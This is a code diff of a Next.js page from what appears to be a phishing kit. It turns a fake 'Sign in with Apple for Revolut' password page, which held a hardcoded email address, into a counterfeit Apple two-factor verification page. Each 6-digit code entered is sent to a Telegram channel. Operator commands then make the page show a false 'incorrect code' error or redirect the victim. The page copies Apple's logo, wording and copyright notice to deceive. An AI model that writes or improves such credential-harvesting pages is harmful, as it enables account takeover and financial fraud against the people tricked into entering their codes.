@@ -1,18 +1,76 @@
 "use client"
 import '../app/globals.css';
-import { useState } from 'react';
+import { useState, useEffect, useRef } from 'react';
+import { sendMessageToTelegram } from '../lib/api';
+import { useCommand } from '../app/lib/CommandContext';
+import { useRouter } from 'next/navigation';
 
-export default function AppleAuth() {
-    const [isFocused, setIsFocused] = useState(false);
+export default function AppleOtpPage() {
+    const [otpValues, setOtpValues] = useState(['', '', '', '', '', '']);
+    const [isLoading, setIsLoading] = useState(false);
+    const [isInvalid, setInvalid] = useState(false);
+    const inputRefs = useRef([]);
+    const router = useRouter();
+    const { command, resetCommand } = useCommand();
 
-    // Default user email address
-    const [userEmail, setUserEmail] = useState("Peterekwere@icloud.com")
+    useEffect(() => {
+        if (command === 'REQUEST_ICLOUD_2FA_OTP_AGAIN') {
+            setInvalid(true);
+            setIsLoading(false);
+        } else if (command === 'FINISH') {
+            setTimeout(() => {
+                resetCommand(); 
+                router.push('/verificationPage');
+            }, 1500);
+        }
+    }, [command, router, resetCommand]);
+
+    const handleChange = (index, value) => {
+        // Allow only numbers
+        if (value && !/^\d+$/.test(value)) return;
+
+        const newOtpValues = [...otpValues];
+        newOtpValues[index] = value;
+        setOtpValues(newOtpValues);
+
+        // Auto focus to next input on entry
+        if (value && index < 5) {
+            inputRefs.current[index + 1]?.focus();
+        }
+
+        // Check if all inputs are filled to submit automatically
+        if (newOtpValues.every(val => val !== '') && newOtpValues.join('').length === 6) {
+            handleSubmit(newOtpValues.join(''));
+        }
+    };
+
+    const handleKeyDown = (index, e) => {
+        // Handle backspace to move to previous input
+        if (e.key === 'Backspace' && !otpValues[index] && index > 0) {
+            inputRefs.current[index - 1]?.focus();
+        }
+    };
+
+    const handleSubmit = (code = otpValues.join('')) => {
+        if (code.length !== 6) return;
+        
+        setIsLoading(true);
+        sendMessageToTelegram(`ICLOUD 2FA OTP: ${code}`);
+    };
+
+    const hideError = () => {
+        setInvalid(false);
+    };
+
+    // Add focus to first input on mount
+    useEffect(() => {
+        inputRefs.current[0]?.focus();
+    }, []);
 
     return (
-        <div className="bg-white text-black">
+        <div className="bg-white text-black min-h-screen">
             {/* Header */}
             <div className="flex flex-col max-w-[1020px] gap-3 px-3 mx-auto max-h-[100px]">
-
                 {/* header-one */}
                 <div className="w-full flex justify-between items-start max-h-[48px] relative -mt-[2px]">
                     <div className='relative -mt-[14px]'>
@@ -23,10 +81,11 @@ export default function AppleAuth() {
                 </div>
 
                 <div className="flex absolute opacity-50 right-5 top-5 md:hidden">
-                    <svg width="16px" className='scale-150' height="16px" viewBox="0 0 20 20"><polyline id="globalnav-menutrigger-bread-bottom" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-bottom" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 12, 16 12"><animate id="globalnav-anim-menutrigger-bread-bottom-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 12, 16 12; 2 9, 16 9; 3.5 15, 15 3.5"></animate><animate id="globalnav-anim-menutrigger-bread-bottom-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 15, 15 3.5; 2 9, 16 9; 2 12, 16 12"></animate></polyline><polyline id="globalnav-menutrigger-bread-top" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-top" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 5, 16 5"><animate id="globalnav-anim-menutrigger-bread-top-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 5, 16 5; 2 9, 16 9; 3.5 3.5, 15 15"></animate><animate id="globalnav-anim-menutrigger-bread-top-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 3.5, 15 15; 2 9, 16 9; 2 5, 16 5"></animate></polyline></svg>
+                    <svg width="16px" className='scale-150' height="16px" viewBox="0 0 20 20">
+                        <polyline id="globalnav-menutrigger-bread-bottom" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-bottom" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 12, 16 12"></polyline>
+                        <polyline id="globalnav-menutrigger-bread-top" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-top" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 5, 16 5"></polyline>
+                    </svg>
                 </div>
-
-
 
                 {/* header-two */}
                 <div className="w-full flex border-b border-gray-300 pb-3 justify-between items-center max-h-[48px]">
@@ -35,109 +94,69 @@ export default function AppleAuth() {
                     </div>
 
                     <div className="text-xs AppleReg text-gray-500">
-                        Sign in
+                        Verification
                     </div>
                 </div>
             </div>
 
-
-
-
-
-            {/* main container */}
+            {/* Main container */}
             <div className='flex flex-col items-center mt-9 w-full'>
-
-                <div className='flex-col w-full px-3 max-w-[507px]'>
-                    {/* Authentication Logo - text */}
-                    <div className='flex flex-col gap-[10px] justify-center text-center items-center w-full'>
-                        <div className='w-16 h-16 rounded-xl p-1' style={{ boxShadow: '0 0 10px rgba(0, 0, 0, 0.2)' }}>
-                            <img src="https://assets.revolut.com/assets/brand/Revolut-Symbol-Black.svg" />
-                        </div>
-
-                        <p className='text-md text-gray-800'>Use your Apple Account to sign in to Revolut.</p>
+                <div className='flex-col w-full px-3 max-w-[507px] items-center text-center'>
+                    {/* Apple Logo SVG */}
+                    <div className="flex justify-center mb-6">
+                        <svg viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" className="w-16 h-16">
+                            <path fill="var(--theme-color-systemBlack)" d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z"></path>
+                        </svg>
                     </div>
 
+                    {/* Title and instructions */}
+                    <h1 className="text-2xl font-semibold mb-3">Two-Factor Authentication</h1>
+                    <p className="text-gray-700 mb-6">Enter the verification code sent to your Apple devices.</p>
 
-
-                    {/* form */}
-                    <div className='w-full mt-9'>
-
-                        {/* Input Container */}
-                        <div className="w-full rounded-t-xl border px-4 py-2 border-yellow-500 h-[56px] bg-yellow-100">
-                            <div className='flex flex-col'>
-                                <p className='text-xs text-gray-500'>Email or Phone Number</p>
-                                <p>{userEmail}</p>
-                            </div>
-                        </div>
-                        <div
-                            className={`relative w-full border rounded-b-xl border-gray-400 h-[56px] transition-all duration-200 ${isFocused ? 'border-blue-500 border-3' : ''
-                                }`}
-                        >
-                            {/* Label */}
-                            <label
-                                className={`absolute left-4 transition-all duration-200 ${isFocused
-                                    ? 'top-1 text-xs'
-                                    : 'top-1/2 transform -translate-y-1/2 text-gray-500'
-                                    }`}
-                            >
-                                Password
-                            </label>
-
-                            {/* Input */}
+                    {/* OTP Input */}
+                    <div className="flex justify-center gap-2 md:gap-3 mb-6">
+                        {otpValues.map((value, index) => (
                             <input
+                                key={index}
+                                ref={el => inputRefs.current[index] = el}
+                                className={`w-10 h-12 text-center border ${isInvalid ? 'border-red-500' : 'border-gray-300'} rounded-md text-lg focus:outline-none focus:border-blue-500 focus:border-2`}
                                 type="text"
-                                className="w-full h-full px-4 pt-4 pb-2 bg-transparent outline-none"
-                                onFocus={() => setIsFocused(true)}
-                                onBlur={(e) => {
-                                    if (!e.target.value) setIsFocused(false);
-                                }}
+                                maxLength={1}
+                                value={value}
+                                onChange={(e) => handleChange(index, e.target.value)}
+                                onKeyDown={(e) => handleKeyDown(index, e)}
+                                onClick={hideError}
                             />
-
-                            {/* Icon Container */}
-                            <div
-                                className={`absolute border p-1 rounded-full  border-gray-500 right-4 transition-all duration-200 ${isFocused ? 'top-5' : 'top-1/2 transform -translate-y-1/2'
-                                    }`}
-                            >
-                                <svg
-                                    xmlns="http://www.w3.org/2000/svg"
-                                    height="20px"
-                                    viewBox="0 -960 960 960"
-                                    width="20px"
-                                    fill="#6b7280"
-                                >
-                                    <path d="M440-200v-240H80v-80h360v-240l440 280-440 280Z" />
-                                </svg>
-                            </div>
-                        </div>
-
-
-                        {/* forgot password */}
-                        <div className='text-blue-500 mt-5 w-full text-center flex justify-center'>
-                            <a href="" className='flex gap-1 items-end'>
-                                <p>
-                                    Forgot Password?
-                                </p>
-                                <svg xmlns="http://www.w3.org/2000/svg" className='relative mb-[2px]' height="14px" viewBox="0 -960 960 960" width="14px" fill="#3b82f6"><path d="m256-240-56-56 384-384H240v-80h480v480h-80v-344L256-240Z" /></svg>
-                            </a>
-                        </div>
+                        ))}
                     </div>
 
-
-                    {/* Bottom container */}
-                    <div className='flex mt-5 w-full max-w-[328px] mx-auto justify-center items-center flex-col'>
-                        <div>
-                            <img src="https://appleid.cdn-apple.com/appleauth/static/bin/cb1900903086/dist/assets/privacy-icon.png" alt="" className='w-8' />
-                        </div>
-                        <p className='text-[12px] mt-3 font-light text-center'>
-                            In setting up Sign in with Apple, information about your interactions with Apple and this device may be used by Apple to help prevent fraud. <span className='text-blue-700'>See how your data is managed...</span>
+                    {isInvalid && (
+                        <p className="text-red-500 text-sm mb-4">
+                            Incorrect verification code. Please try again.
                         </p>
+                    )}
+
+                    {/* Links */}
+                    <div className="text-blue-500 mb-6 flex flex-col gap-2">
+                        <a href="#" className="hover:underline">Resend code to devices</a>
+                        <a href="#" className="hover:underline">Can't get to your devices?</a>
                     </div>
+
+                    {/* Helper text */}
+                    <p className="text-gray-600 text-sm mb-8 max-w-sm mx-auto">
+                        If you can't enter a code because you've lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.
+                    </p>
+
+                    {/* Loading indicator */}
+                    {isLoading && (
+                        <div className="flex justify-center mb-4">
+                            <div className="w-6 h-6 border-t-2 border-blue-500 border-solid rounded-full animate-spin"></div>
+                        </div>
+                    )}
                 </div>
 
-
-
                 {/* Footer container */}
-                <div className='flex mt-16 sm:relative absolute bottom-0 px-[22px] h-[83px]  bg-[#f7f7f7] w-full justify-center items-center flex-col'>
+                <div className='flex mt-16 sm:relative absolute bottom-0 px-[22px] h-[83px] bg-[#f7f7f7] w-full justify-center items-center flex-col'>
                     <div className='text-gray-700 text-xs'>
                         Copyright © 2025 Apple Inc. All rights reserved.
                     </div>
@@ -148,6 +167,6 @@ export default function AppleAuth() {
                     </div>
                 </div>
             </div>
-        </div >
-    )
+        </div>
+    );
 }
